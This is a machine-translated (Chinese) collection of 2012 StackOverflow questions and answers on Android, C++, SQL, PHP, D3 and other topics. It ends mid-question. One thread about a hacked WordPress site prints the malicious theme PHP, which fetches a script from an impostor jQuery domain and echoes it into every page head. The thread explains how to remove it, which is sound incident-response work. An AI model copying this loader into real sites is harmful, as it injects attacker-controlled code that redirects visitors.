# StackOverflow 问答 11786000-11786999

# android - android-toolbox 展示崩溃

> ID：11786001
> 
> 赞同：0
> 
> 时间：2012-08-02T21:22:47.827
> 
> 标签：android

我是一名安卓开发者。我刚刚为 Android 工具箱导入了最新的 zip，并尝试运行展示：当应用程序运行时出现以下错误。我在安卓 4.03

```
8-02 14:19:25.534: E/AndroidRuntime(32732): java.lang.NoClassDefFoundError: com.bugsense.trace.BugSenseHandler

08-02 14:19:25.534: E/AndroidRuntime(32732):    at   de.viktorreiser.androidtoolbox.showcase.AndroidToolboxShowcaseActivity.onCreate(AndroidToolboxShowcaseActivity.java:68) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T21:30:29.930

只需注释掉 BugSenseHandler。它不是必需的。

# c++ - Windows 7 和 c++：在 Raspberry Pi 上使用的交叉编译应用程序

> ID：11786004
> 
> 赞同：5
> 
> 时间：2012-08-02T21:23:10.927
> 
> 标签：c++, windows, qt, cross-compiling, raspberry-pi

我最近得到了一个 Raspberry Pi，并在上面安装了 Raspbian “wheezy” 图像。我的主要开发机器运行的是 Windows 7，我使用 Qt Creator 作为我的开发环境。我正在尝试找到一个工具链，我的主计算机可以使用它来为 Raspberry Pi 编译我的 c++ 应用程序。我到处寻找有关如何做到这一点的教程和文章，但我能找到的只是从 linux 编译到 windows 的教程。这与我正在尝试做的相反。我还注意到 Qt SDK 附带了一个可用的图像，但我现在更愿意使用 Raspbian 图像。有没有人能找到一种方法让程序从 Windows 到那里 Pi？在交叉编译方面，我是一个认真的新手。丁：

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-02T11:56:46.837

我最近给自己买了一个树莓派。

我通常使用 Java 进行开发并使用 NetBeans，但开始使用 NetBeans 开发 C 和 C++ 应用程序。为此，我在 Windows 7 上安装了 Cygwin，以便能够编译基于 Windows 的应用程序。

但是，我也可以使用相同的 NetBeans IDE 为我的 Raspberry Pi 编译我的应用程序。我所要做的就是在 NetBeans 中右键单击项目名称，选择`Set build host`，然后`Manage Hosts`将显示一个对话框。在主机名字段中选择`Add`并输入您的 Raspberry Pi IP 地址，然后单击`Next`。

Netbeans 将尝试通过 SSH 建立与 Raspberry Pi 的连接，因此您必须确保启用 SSH。在登录字段中输入您的 Raspberry Pi 用户名，然后`Next`再次单击。系统将提示您确认 SSH 密钥并输入 Raspberry Pi 用户名。

现在只需确认详细信息，单击完成，然后玩得开心。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T22:36:05.983

如果您没有找到任何东西，您可以使用虚拟机。（虚拟机）

在其上运行 Linux 并在您放置项目的位置创建一个共享文件夹。所以你只需要切换到 linux 进行编译；）

另一件事是看看cygwin。它是一个完整的 Linux shell，包括 gcc。所以可能你可以使用它。

如果您对此感兴趣，请查看这些 VM：- [VirtualBox](https://www.virtualbox.org/) - [Microsoft Virtual PC](http://www.microsoft.com/windows/virtual-pc/default.aspx)

# iphone - 使用 XCode 向我的 searchButtonPressed 添加第二个标准

> ID：11786009
> 
> 赞同：0
> 
> 时间：2012-08-02T21:23:40.427
> 
> 标签：iphone, objective-c, xcode, search

下面的代码示例显示了我如何在带有字典的数组的 plist 中搜索“名称”字符串。现在我在视图中添加了两个 UISlider：sliderOne 和 sliderTwo。我想在 searchButtonPressed 时将它们用作第二个标准，这意味着：

resultObjectsArray 现在包含 objectName 包含 nameString 的对象（如示例）并且 objectPrice 介于 sliderOne 和 sliderTwo 的值之间。但如果滑块一的值高于滑块二的值，则跳过此条件。

你能用下面的例子告诉我如何做到这一点吗？价格是 plist 字典中的一个数字（实数），如“99,90”。

```
-(IBAction)searchButtonPressed:(id)sender{  

     NSString *path = [[NSBundle mainBundle] pathForResource:@"Objects" ofType:@"plist"];
     allObjectsArray = [[NSMutableArray alloc] initWithContentsOfFile:path];

    NSString *nameString = [NSString stringWithFormat:@"%@", [nameTextField text]];

    resultObjectsArray = [NSMutableArray array];
    for(NSDictionary *object in allObjectsArray)
    {
        NSString *objectName = [object objectForKey:@"Name"];
        NSString *objectPrice = [wine objectForKey:@"Price"];

        NSRange range = [objectName rangeOfString:nameString options:NSCaseInsensitiveSearch];
        if(range.location != NSNotFound)
        [resultObjectsArray addObject:object];
    } 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T23:19:17.640

我想我理解你的问题，在这种情况下，仅仅改变条件还不够

```
if (range.location != NSNotFound)
    [resultObjectsArray addObject:object]; 
```

和

```
BOOL priceConditionGood = YES;
if (sliderOne.value <= sliderTwo.value && (objectPrice.floatValue < sliderOne.value || objectPrice.floatValue > sliderTwo.value))
    priceConditionGood = NO;
if (range.location != NSNotFound && priceConditionGood)
    [resultObjectsArray addObject:object]; 
```

让我知道这是否适合你！

# android - Spanned Textview HTML 格式仅适用于循环中的最后一个？

> ID：11786010
> 
> 赞同：0
> 
> 时间：2012-08-02T21:23:40.740
> 
> 标签：android, html, textview, spannable, spanned

我需要能够遍历我的所有元素并将其设置为 Textview。但是，我还需要将我的数字格式化为下标。我尝试使用循环这样做，但只有最后一个数字的格式正确。

例如，如果我输入 Fe2Zn7Ag4，则只有“4”将在下标中，其余的将正常。这是我的代码：

```
Spanned EF = Html.fromHtml("");
for(int g = 0; g < numSaved; g++)
{
    EF = Html.fromHtml(EF + savedChem[g].getFormula());
    if(!(savedChem[g].getMoles().equals("1")) && !(savedChem[g].getMoles().equals("0")))
        EF = Html.fromHtml(EF + "<sub>" + savedChem[g].getMoles() + "</sub>");
}
EmpiricalFormula.setText(findEmpirical()); 
```

此外，任何下标的东西都会被切成两半。当我运行程序时，只会出现下标数字的上半部分。

知道如何解决这两个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T00:15:26.377

我找到了我的答案。结果 Html.fromHtml() 将我以前的 Spanned 对象转换为每个循环的字符串，因此您只以最后一个结束。我用以下代码解决了这个问题：

```
Spanned[] E = new Spanned[numSaved];
for (int a = 0; a < numSaved; a++)
{
    EF =(Spanned) TextUtils.concat(EF, E[a]);
} 
```

我还通过添加“小”标签来解决我的下标问题。

```
<sub><small>" + savedChem[g].getMoles() + "</small></sub> 
```

# sql - 按相似日期对 SQL Server 结果进行分组

> ID：11786011
> 
> 赞同：0
> 
> 时间：2012-08-02T21:23:49.273
> 
> 标签：sql, sql-server-2008-r2

我有一个项目要求我将 SQL Server 数据库中的医疗程序与相应的结果进行匹配。EX：程序注释包含`screening`并且结果注释出现在该程序包含的一周内`abnormal`。

问题是程序注释和结果都作为同一个表中的文本进入数据库，它们拥有的唯一链接信息是患者 ID。我需要为每个匹配的程序/结果列出患者 ID 和日期。

我考虑过首先将所有文本匹配过程和文本匹配结果排序到单独的临时表中，然后以某种方式加入它们，但我不确定这将如何按“彼此相隔一周”分组并丢弃剩余部分。

有小费吗？任何有助于从这里回答的信息？

要求的附加信息：

基本上我有这个：

```
PatientID       ReportType       ReportDate     ReportText

24734           Procedure        1/1/1901       Lots O HTML
24734           Report           1/2/1901       Lots O HTML
... 
```

此表是已在 ReportText 列中过滤“筛选”和“异常”的结果。因此，鉴于上面的两个结果，我们可以看到患者 ID 匹配，并且每个报告类型在一周内都有一个，因此它们应该是匹配的并列为一个行项目。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T09:52:42.220

您可以执行以下操作

```
select   * 
from     tableA a1
         inner join tableA a2
           on  a1.patientid = a2.patientid
           and a2.textvaluecolumn = 'abnormal'
where    a1.textvaluecolumn = 'screening'
and      datediff(wk, a1.date, a2.date) = 1 
```

所以你在 patientid 上加入同一张表，其中左表为筛查部分，右表为异常部分。稍后，您将获得一些日期，您可以使用 datediff 函数将它们相减，该函数返回开始和结束之间的周数 (wk) 差异。您也可以为此使用天数 (d) :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T21:38:39.493

当数据如下时会发生什么：

```
patientID    text        date 
1            procedure1   1/1/12 
1            procedure2   1/2/12 
2            procedure1   1/5/12 
2            result1      1/12/12 
1            result2      1/8/12 
1            result1      1/9/12 
```

你怎么知道结果文本实际上与程序匹配？

# iphone - uisearchbar 中的 exc_bad_access (code=2, address=0x27)

> ID：11786017
> 
> 赞同：1
> 
> 时间：2012-08-02T21:24:44.643
> 
> 标签：iphone, ios, ipad, uisearchbar

我是 iPhone 的新手，我在这个链接中创建了一个 SearchViewController： [UISearchBar](http://zaldzbugz.posterous.com/how-to-search-a-string-inside-uiwebview) 但是当我按下 SearchBar 时出现以下错误：main.m 中的 EXC_BAD_ACCESS (code=2, address=0x27)：

```
int main(int argc, char *argv[])
{
@autoreleasepool {
     //in this line it gives me the error
    return UIApplicationMain(argc, argv, nil, NSStringFromClass([MFAppDelegate class])); 

}
} 
```

在这个问题上有任何帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T00:17:16.293

要找到释放成员的类，您可以启用 ZombieMode，以及帮助您了解内存管理错误的回溯。

# php - 条件在 wordpress 中不起作用

> ID：11786018
> 
> 赞同：0
> 
> 时间：2012-08-02T21:24:47.357
> 
> 标签：php, wordpress, conditional

我正在使用以下代码来显示 Genesis 中的帖子信息。但我有一个问题。**我不想在某些特定页面（如博客页面和主页）上显示帖子信息。**

所以我尝试了一些方法但没有奏效。

实际上我已经创建了页面模板.. **page-blog.php**和**page-home.php**

```
remove_action( 'genesis_before_post_content', 'genesis_post_info' );
add_action( 'genesis_before_post_title', 'child_post_info' );

function child_post_info() {
    if (!is_page('blog')) {
    return;
?>

    <div class="post-info">
        <span class="date published time">
            <time class="entry-date" itemprop="startDate" datetime="<?php echo get_the_date( 'c' ); ?>" pubdate><?php echo get_the_date(); ?></time>
        </span> By 
        <span class="author vcard">
            <a class="fn n" href="<?php echo get_the_author_url( get_the_author_meta( 'ID' ) ); ?>" title="View <?php echo get_the_author(); ?>'s Profile" rel="author me"><?php the_author_meta( 'display_name' ); ?></a>
        </span>
        <span class="post-comments">&middot; <a href="<?php the_permalink() ?>#comments"><?php comments_number( 'Leave a Comment', '1 Comment', '% Comments' ); ?></a></span>
        <?php // if the post has been modified, display the modified date
        $published = get_the_date( 'F j, Y' );
        $modified = the_modified_date( 'F j, Y', '', '', FALSE );
        $published_compare = get_the_date( 'Y-m-d' );
        $modified_compare = the_modified_date( 'Y-m-d', '', '', FALSE ); 
            if ( $published_compare < $modified_compare ) {
                echo '<span class="updated"><em>&middot; (Updated: ' . $modified . ')</em></span>';
            } ?>
    </div>
<?php }
} 
```

请给我一些想法，我该如何解决这个问题。

**现在：**

我创建了一个新文件**meta-postinfo.php**

并保存

```
<div class="post-info">
...
</div> 
```

并在functions.php文件中..

```
remove_action( 'genesis_before_post_content', 'genesis_post_info' );
add_action( 'genesis_before_post_title', 'child_post_info' );

function child_post_info() {
    if ( !is_home() && !is_page(array('blog', 'inspiring quotes')) ) { 
        get_template_part('meta', 'postinfo'); 
    }; 
} 
```

上面的代码适用于博客页面和主页，但不适用于“**鼓舞人心的报价**”页面，尽管我已经尝试过

```
 if ( !is_home() && !is_page('blog') && !is_page('inspiring quotes') ) { 
```

但不工作..你有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:30:51.377

要从特定页面隐藏模板中的给定函数，请使用 is_page() 函数，如下所示（使用 about slug 隐藏页面）：

```
<?php
if ( !is_page('about') ) {
// This function will not run on the homepage
}; 
?> 
```

要从主页中隐藏某些内容，请使用 is_Home

```
<?php
if ( !is_home() ) {
// This function will not run on the homepage
}; 
?> 
```

请参阅：[http](http://codex.wordpress.org/Function_Reference/is_page) ://codex.wordpress.org/Function_Reference/is_page和[http://codex.wordpress.org/Function_Reference/is_home](http://codex.wordpress.org/Function_Reference/is_home)

编辑：这不会在 add_action 调用的函数中，而是可以直接写入您的模板中应该显示的位置，例如：

```
<?php
if ( !is_home() ) {
   <div class="post-info">
    <span class="date published time">
    // ... the rest of this display template.
   }; 
  ?> 
```

如果要在多个模板中使用它，您可以将其移动到单独的文件并使用如下：

```
<?php
if ( !is_home() ) {
   get_template_part('postinfo');
   }; 
  ?> 
```

# c# - 想在asp.net c#中使用Resolve.url时打开新标签页

> ID：11786021
> 
> 赞同：2
> 
> 时间：2012-08-02T21:24:55.813
> 
> 标签：c#, asp.net

想要在 asp.net c# 中使用 Resolve.url 时打开新选项卡。

```
 previewlink.NavigateUrl = ResolveUrl("~/admin/Preview_paper.aspx"); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T21:25:57.360

将超链接的`Target`属性设置为“_blank”：

`Target = "_blank"`

虽然不用说，如果用户的浏览器设置是使用新窗口而不是选项卡，这将在新窗口中打开它，但我猜这不是问题。

编辑：这里有一些示例代码

```
previewlink.NavigateUrl = ResolveUrl("~/admin/Preview_paper.aspx");
previewlink.Target = "_blank"; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T21:26:16.077

必须设置超链接的目标属性`"_blank"`才能在新窗口中打开目标网址

请设置`target = "_blank"`

**更新：关于 OP 的评论**

```
The target is a property as you can see below of the Hyperlink 
   <asp:HyperLink id="hyperlink1" 
                  ImageUrl="images/pict.jpg"
                  NavigateUrl="http://www.microsoft.com"
                  Text="Microsoft Official Site"
                  Target="_blank"
                  runat="server"/> 
```

# javascript - 如何禁用 d3.behavior.zoom 的双击缩放？

> ID：11786023
> 
> 赞同：50
> 
> 时间：2012-08-02T21:25:02.703
> 
> 标签：javascript, d3.js

我不希望[d3.behavior.zoom](https://github.com/mbostock/d3/wiki/Zoom-Behavior#wiki-zoom)在我的图表上添加双击缩放的功能。如何禁用此行为？

这是一个带有不需要的行为的[JSFiddle 。](http://jsfiddle.net/brantolsen/Ld6Uz/)

我已经尝试了以下没有任何运气。

```
 d3.behavior.zoom.dblclick = function() {}; 
```

* * *

## 回答 #1

> 赞同：111
> 
> 时间：2012-08-03T03:22:23.013

您可以通过删除缩放行为的 dblclick 事件侦听器来禁用双击行为。查看您的代码，您已将缩放行为分配给 SVG 元素。所以你可以说：

```
d3.select("svg").on("dblclick.zoom", null); 
```

或者，连同您注册缩放行为的位置：

```
.call(d3.behavior.zoom().on("zoom", update)).on("dblclick.zoom", null) 
```

您可能还希望将缩放行为向下移动到[G 元素](http://www.w3.org/TR/SVG/struct.html#Groups)，而不是将其放在根 SVG 元素上；我不确定它能否在根 SVG 上正常工作，因为 SVG 元素不支持[transform 属性](http://www.w3.org/TR/SVG/coords.html#TransformAttribute)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-11-03T11:03:04.147

设置代理功能很容易。存储默认（目标）事件，然后注册一个代理事件。然后，代理将使用您需要的任何逻辑启用/禁用目标事件：

```
svg.call(zoom);
var dblclickTarget = svg.on("dblclick.zoom");
var mouseScrollTarget = svg.on("mousewheel.zoom");

function eventProxy(fn){
  return function(){
    // Enable events if enableEvents=== true
    if(enableEvents){
      fn.apply(this, arguments)
    }
  }
};

svg.on("wheel.zoom", eventProxy(dblclickTarget))
   .on("mousewheel.zoom", eventProxy(mouseScrollTarget));
```

通过以这种方式应用代理模式，您可以简单地更改“enableEvents”变量来启用或禁用事件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-09-14T20:42:26.180

我相信所选答案适用于小于 5 的版本，但以防万一这是我解决问题版本 5.15.x 的方式

使用这个 .on("dblclick.zoom", null); 在文档中注明，但当我尝试使用它时它实际上抛出了一个错误（你能相信我的应用程序的神经吗？哈哈）。

[https://github.com/d3/d3-zoom/blob/main/README.md#zoomTransform](https://github.com/d3/d3-zoom/blob/main/README.md#zoomTransform)

.filter 没有使用 dblclick.zoom 方法，而是为我解决了问题。

我已经在使用双击事件来满足其他用户的需求。因此，在某些特定情况下，我不希望发生双击缩放。

```
D3.select('svg')
      .call(D3.zoom()
        .scaleExtent([-5, 8])
        .extent([[0, 0], [300, 300]])
        .on('zoom', () => {

          D3.selectAll('g')
            .attr('transform', D3.event.transform);

          this.updateAfterInit(this.root);

        })
        .filter(() => {

          const foundNode = this.N.findNodeByID(D3.event.srcElement.id.split('_')[1])
          if ( !!foundNode && D3.event.type === 'dblclick' && foundNode.data.type === 'SearchRelationspec') {
            return false;
          } else {
            return !D3.event.target.classList.contains('drawarea') && D3.event.type === 'dblclick';
          }
        }) 
```

# desire2learn - 在 Desire2Learn Valence 中创建组

> ID：11786025
> 
> 赞同：0
> 
> 时间：2012-08-02T21:25:10.603
> 
> 标签：desire2learn

我正在尝试使用 Valence 创建一个组。一切看起来都正确（存在 orgunit 和 group 类别），但我收到一个 WebException 指示“未找到”。我的测试程序的输出如下。谁能确认 uri 和 JSON 块的文档是正确的并且“创建组”功能确实有效？

```
D:\d2lmgmt>Valence.exe function=create_orgunit_groupcategory_group requestor=hidden orgunitid=16800 groupcategoryid=2845
Uri:  "/d2l/api/lp/1.0/16800/groupcategories/2845/groups/", method:  "POST"
POST input:  "{"Name":"grouptest name","Code":"grouptestcode","Description":{"Text":"grouptest text","Html":"grouptest html"}}"
WebException:  Not found 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:56:29.250

您发送的输入似乎是“RichText”而不是“RichTextInput”，后者的[结构略有不同](http://docs.valence.desire2learn.com/basic/conventions.html#commonly-used-fields)。

要求：

```
POST https://valence.desire2learn.com/d2l/api/lp/1.0/7733/groupcategories/1879/groups/?x_b=TwULqrltMXvTE8utuLCN5O&x_a=L2Hd9WvDTcyiyu5n2AEgpg&x_d=NPSqMuaKFhpcE2TWRbvh-wK4I25tGdFPzUzqpolELKk&x_c=IQwjo0WycWje8IrhJuxqMC7U5BWOVVwwMFAZWp3a1ag&x_t=1343942454 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: application/json
Content-Type: application/json

{
    "Name": "Group 1",
    "Code": "Group 1 code",
    "Description": {
        "Content": "Group 1 description",
        "Type": "Text"
    }
} 
```

回复：

```
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store
Pragma: no-cache
Content-Length: 109
Content-Type: application/json; charset=UTF-8
Expires: -1
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
X-AspNet-Version: 2.0.50727
Date: Thu, 02 Aug 2012 21:20:44 GMT

{"GroupId":7744,"Name":"Group 1","Description":{"Text":"Group 1 description","Html":""},"Enrollments":[4062]} 
```

# java - Java 输入不适用于画布

> ID：11786026
> 
> 赞同：0
> 
> 时间：2012-08-02T21:25:12.253
> 
> 标签：java, graphics, input

我正在用Java制作一个基本程序。我让 Input 使用此代码：

```
package main;
import java.awt.event.KeyEvent;
import java.awt.event.KeyAdapter;

public class Input extends KeyAdapter{
    public void keyPressed(KeyEvent ke){
        _press[ke.getKeyCode()] = true;
        _pressed[ke.getKeyCode()] = true;
    }
    public void keyReleased(KeyEvent ke){
        _press[ke.getKeyCode()] = false;
        _released[ke.getKeyCode()] = true;
    }
    public void update(){
        for (int i = 0; i < _press.length; i ++){
            _pressed[i] = false;
            _released[i] = false;
        }
    }
    /**
     * checks if a key is being pressed
     * @param key an integer representing a key(Key class recommended)
     * @return boolean
     */
    public static boolean check(int key){
        if (_press[key]) return true; else return false;
    }
    /**
     * checks if a key was pressed
     * @param key an integer representing a key(Key class recommended)
     * @return boolean
     */
    public static boolean pressed(int key){
        if (_pressed[key]) return true; else return false;
    }
    /**
     * checks if a key was released
     * @param key an integer representing a key(Key class recommended)
     * @return boolean
     */
    public static boolean released(int key){
        if (_released[key]) return true; else return false;
    }
    protected static boolean[] _press = new boolean[128];
    protected static boolean[] _pressed = new boolean[128];
    protected static boolean[] _released = new boolean[128];
} 
```

我进行了测试，我得到了一个使用 ArrayList 工作的基本实体系统，一切都很好。

但后来我遇到了图形。

我设置了一个 Jcanvas 类（扩展了 Canvas），但是在将它添加到我的框架后，图形可以正常工作，但我的输入根本不起作用。

```
canvas = new Jcanvas();
canvas.setSize(width, height);
canvas.setBackground(Color.RED);
frame.add(canvas);

//input
frame.addKeyListener(new Input()); 
```

有没有办法解决这个问题，还是我会被图形或输入卡住？

这是我的 Jcanvas 类供参考：

```
package main;
import java.awt.Canvas;
import java.awt.Graphics;

public class Jcanvas extends Canvas{
    static final long serialVersionUID = 42L;
    public void paint(Graphics g){
    }
    public void drawrect(int x, int y, int width, int height){
        Graphics g = getGraphics();
        //g.setColor(Color.blue);
        g.drawRect(x, y, width, height);
    }
    public void drawfill(Graphics g, int x, int y, int width, int height){
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T23:40:16.843

尝试添加：

```
//input
Input input = new Input();
frame.addKeyListener(input);
canvas.addKeyListener(input); 
```

# php - 时间格式 [year]/[month]/[day]-[hour]:[min] 的简单正则表达式

> ID：11786027
> 
> 赞同：0
> 
> 时间：2012-08-02T21:25:12.320
> 
> 标签：php, regex

什么是用于`preg_match`函数的简单时间格式正则表达式
我尝试找到一个时间格式精确的正则表达式：`2012/05/23-23:56`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:27:08.103

最简单的方法是

```
\d{4}/\d{2}/\d{2}-\d{2}:\d{2} 
```

但这只是一个粗略的句法匹配。您可能仍想确保它实际上是日期和时间。您可以使用`DateTime::createFromFormat`如下格式字符串（未经测试）：

```
%Y/%m/%d-%G-%i 
```

# c# - 我的 webusercontroler 出现问题（解析器错误）

> ID：11786028
> 
> 赞同：1
> 
> 时间：2012-08-02T21:25:17.697
> 
> 标签：c#, asp.net, webforms, webusercontrol

我在我的 asp.net webforms 应用程序上创建了一个 webusercontrol。但是当我尝试运行它时出现此解析器错误

> 说明：解析服务此请求所需的资源时出错。请查看以下特定的解析错误详细信息并适当地修改您的源文件。
> 
> 解析器错误消息：未知的服务器标记“uc1:WebUserControl1”。

我的站点管理员中有此代码：

```
<asp:ScriptManager ID="ScriptManager1" runat="server">
</asp:ScriptManager>
<asp:UpdatePanel ID="UpdatePanel1" runat="server" UpdateMode="Conditional">
    <ContentTemplate>
        <uc1:WebUserControl1 ID="WebUserControl11" runat="server" />
    </ContentTemplate>
</asp:UpdatePanel> 
```

这是我在解决方案中创建的 WebUserControl：

```
<%@ Control Language="C#" AutoEventWireup="true" CodeBehind="WebUserControl1.ascx.cs" Inherits="GameShops.WebUserControl1" EnableViewState="true" %>
<asp:Panel ID="Panel1" runat="server">
    <asp:Label ID="usrlblAntalVaror" runat="server" Text="Inga Varor"></asp:Label>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <asp:Label ID="usrlblTotalpris" runat="server" Text="0 kr"></asp:Label>
    <br />
    <asp:DropDownList ID="usrDdlVaror" runat="server" Height="25px" Width="148px" 
         AutoPostBack="True" EnableViewState="True">
    </asp:DropDownList>
    <asp:ImageButton ID="usrbtnTabort" runat="server" AlternateText="Ta Bort" 
        Height="26px" ImageUrl="~/Image/RecycleBin.png" Width="29px" CommandName="usrbtnTabort_click" OnCommand="usrbtnTabort_click" />
    <br />
    <br />
    <asp:Button ID="usrTillKassanBtn" runat="server" Text="Till Kassan" 
        onclick="usrTillKassanBtn_Click" />
</asp:Panel>
<p></p> 
```

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:49:51.100

您需要在母版页上注册用户控件。

```
<%@ Register Src="~/WebUserControl.ascx" TagName="WebUserControl1" TagPrefix="uc1" %> 
```

# javascript - Jquery"s" 恶意软件脚本

> ID：11786030
> 
> 赞同：3
> 
> 时间：2012-08-02T21:25:47.323
> 
> 标签：javascript, jquery, malware

我的网站被黑了，我一辈子都找不到它被注入的地方。我已采取必要的预防措施以确保它不会再次发生，并且我正在将我的网站从备份恢复到更早的时间，但我想知道在哪里可以找到它，以防它发生在我托管的另一个网站上。

这是恶意脚本：http://www.jquerys.org/ajax/libs/jquery/jquery-1.6.3.min.js

这是网站：（现已删除）

我到处检查过，但都没有成功。

任何帮助将不胜感激。

谢谢你。

**对于那些投票给我的人，我已经做了很多研究，试图在过去的 4 个小时里自己解决这个问题，我的腿上有一个 11 个月大的孩子。我只是在万不得已的情况下才发布这个问题，因为我自己没有成功地做到这一点。由于过去我从这里的人那里得到了很大的帮助，所以我认为问一下也无妨。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-02T22:10:41.157

*写下所有评论作为答案，因为这里有很好的信息来对抗漏洞利用。*

* * *

## 问题

在 Wordpress 驱动的站点的源代码中发现了一个带有冒充 jQuery CDN 的 URL 的脚本。听起来 jquerys.com 和 jqueryc.com 都被用作冒名顶替的域。

恶意代码很简单；它随机重定向到另一个站点并设置一个 cookie 以防止立即重定向（每天一次）。由于它不常见，因此在开发站点时可能永远不会看到它，或者忽略它。

## 可能的原因

*   输入网址错误
*   受损的服务器
*   恶意主题
*   一个恶意插件

## 解析度

开始：[http ://codex.wordpress.org/FAQ_My_site_was_hacked](http://codex.wordpress.org/FAQ_My_site_was_hacked)

OP 在主题中找到了这段代码：

```
// !!! Suspect Code - Do not use for any purpose !!!

//Jquery Function 
if (!function_exists('insert_jquery_theme')){
    function insert_jquery_theme(){
        if (function_exists('curl_init')){
        $url="jqueryc.com/jquery-1.6.3.min.js";
        $ch = curl_init();
        $timeout = 5;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        $data = curl_exec($ch);
        curl_close($ch);
        echo $data;
     }
  }

  add_action('wp_head', 'insert_jquery_theme');
} 
```

查看源码，其实有两个对jQuery的引用；一种合法，一种不合法。删除上述代码片段可以解决问题。

确定恶意代码的来源（例如主题、插件或受感染的服务器）仍然很重要。如果不检查它们是否存在恶意代码，则不应恢复备份。

## 相关链接

*   [jQuery bugtracker 中的无效票证](http://bugs.jquery.com/ticket/12113)
*   [WordPress 支持论坛](http://wordpress.org/support/topic/couldnt-find-database-jqueryc_db-help)

# java - 使用枚举对列表进行排序

> ID：11786035
> 
> 赞同：3
> 
> 时间：2012-08-02T21:25:56.937
> 
> 标签：java, sorting

我一直在寻找一种方法来仅根据其多个字段中的一个对对象列表进行排序（我最终只是自己问了这个问题），但在我的研究中，我遇到了这个答案：

[https://stackoverflow.com/a/1421537/1549672](https://stackoverflow.com/a/1421537/1549672)

我对java很陌生，这可能就是原因，但我不太明白最后一种方法：

```
public static Comparator<Person> getComparator(final PersonComparator... multipleOptions) {
    return new Comparator<Person>() {
        public int compare(Person o1, Person o2) {
            for (PersonComparator option : multipleOptions) {
                int result = option.compare(o1, o2);
                if (result != 0) {
                    return result;
                }
            }
            return 0;
        }
    };
} 
```

有人可以解释一下它是如何工作的……它到底是做什么的？谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T21:28:37.967

它将找到第一个不会返回“equals”的比较器并返回其值，否则它将返回“equals”。

实际上，它将通过创建一个基于 Comparator 接口的匿名类来创建一个新的 Comparator 来执行此操作。

```
public static Comparator<Person> getComparator(
   final PersonComparator... multipleOptions) 
{        
    return new Comparator<Person>() { //create anonymous class 
        public int compare(Person o1, Person o2) { //which implements the only method 
                                                   //in Comparator
            for (PersonComparator option : multipleOptions) { //loop through given 
                                                              //comparators
                int result = option.compare(o1, o2);
                if (result != 0) {                         //return value of the first
                    return result;                         //which says "non-equal"
                }
            }
            return 0;//all said "equals" so we say "equals"
        }
    };
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:06:28.757

`getComparator`方法将返回比较器，该比较器将`Person`根据在其参数中传递的比较器比较两个对象。每个`PersonComparator`s 旨在通过 Person 类字段之一来比较 Person，例如

*   `PersonComparator.ID_SORT``id`将通过(0 < 1 < 2 < 3 < ...)比较 Person 对象
*   `PersonComparator.NAME_SORT`将使用自然（字典）顺序（“a”<“aa”<“ab”<“b”）按名称比较 Person 对象。

如果您的 Person 类有更多字段，那么您可以向 enum 添加新的比较器`PersonComparator`。

`getComparator`传递给方法 的 PersonComparators 的顺序也很重要。
例如，如果您有 Persons

```
Person p1 = new Person(1,"Jack");
Person p2 = new Person(2,"Jack");
Person p3 = new Person(2,"Adam"); 
```

你将创建比较器

```
getComparator(PersonComparator.ID_SORT,PersonComparator.NAME_SORT) 
```

它会先按他们`id`的 s 对人进行排序，如果 id 相同，那么它将按他们的名字对他们进行排序

`(1,"Jack") (2,"Adam") (2,"Jack")`

也是由创建的比较器

```
getComparator(PersonComparator.NAME_SORT, PersonComparator.ID_SORT) 
```

将首先比较名称，并且仅当名称相等时才会比较人员的 ID，因此您将以这种方式对人员进行排序

`(2,"Adam") (1,"Jack") (2,"Jack")`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T21:27:57.013

您正在使用[Comparator](http://docs.oracle.com/javase/6/docs/api/java/util/Comparator.html#compare%28T,%20T%29)比较两个人对象。

> 比较它的两个参数的顺序。返回负整数、零或正整数，因为第一个参数小于、等于或大于第二个参数

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T21:31:46.593

基本上，此方法接收可变数量的 PersonComparator 对象，然后遍历它们以比较两个人员对象，返回第一个比较器，该比较器不返回两个给定人员对象之间的匹配项。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-02T21:33:30.527

您将其他比较器的列表传递`final PersonComparator... multipleOptions`给 method `getComparator`。

您的比较器在 for 循环中使用此 PersonComparators，如果由于当前 PersonComparator 而导致人员不相等，则返回结果。

因此，基本上，此方法返回 Comparator，如果 Persons 由于所有传递的比较器而相等，则返回 0，或者从传递的比较器`compareTo`方法返回第一个不匹配的 int。

# css - CSS 层次结构 - div 中的 div

> ID：11786036
> 
> 赞同：2
> 
> 时间：2012-08-02T21:26:06.057
> 
> 标签：css

我有一些从几个来源拼凑而成的 CSS，但我的问题非常基本。

